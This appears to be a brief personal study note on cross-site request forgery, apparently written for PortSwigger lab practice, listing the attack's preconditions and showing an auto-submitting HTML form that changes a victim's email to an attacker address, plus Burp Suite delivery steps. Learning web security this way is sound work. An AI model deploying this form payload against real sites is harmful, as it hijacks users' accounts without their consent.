### CSRF

Cause a victim to do an action unintentionally by having them make a request (e.g. `https://example.com/changeemail?email=attacker@email.com`)

CSRF requires:
- An action to induce
- Solely cookie-based session handling (not using SameSite)
  - Can also work with basic auth or cert-based auth
- No unpredictable parameters (like anti-csrf tokens)

POST request CSRF example:
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Can be generated using the CSRF PoC generator in burp suite professional
- Select request -> Generate CSRF PoC
- When using Portswigger's exploit server:
  - Paste the payload (without html or body), hit store, then hit deliver

